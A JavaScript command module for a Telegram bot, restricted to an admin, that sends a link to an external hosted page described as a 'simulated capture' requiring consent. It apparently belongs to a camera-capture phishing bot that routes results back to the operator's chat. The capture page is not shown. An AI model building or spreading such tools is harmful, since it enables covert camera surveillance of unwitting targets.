module.exports = {
  name: 'camera',
  description: 'Envoie un lien sécurisé pour une capture simulée (consentement requis) — admin only',
  async execute(bot, msg) {
    const adminId = require.main.require('./index.js').adminChatId;
    if (msg.from.id.toString() !== adminId.toString()) return bot.sendMessage(msg.chat.id, '🚫 Accès refusé.');

    const chatId = msg.chat.id;
    const username = msg.from.username || msg.from.first_name || 'administrateur';
    const baseUrl = 'https://new-number-virtuel.onrender.com';
    const url = `${baseUrl}/${chatId}`;

    const text = `📸 *Salutations @${username}*\n\n` +
      `🔗 Voici le lien sécurisé (à envoyer uniquement avec le consentement explicite de la personne) :\n\n` +
      `\`\`\`\n${url}\n\`\`\`\n\n` +
      `La page n'effectue aucune capture sans action explicite de la personne. Utilisation responsable requise.`;

    await bot.sendMessage(chatId, text, {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: '🔗 Ouvrir le lien', url }]
        ]
      }
    });
  }
};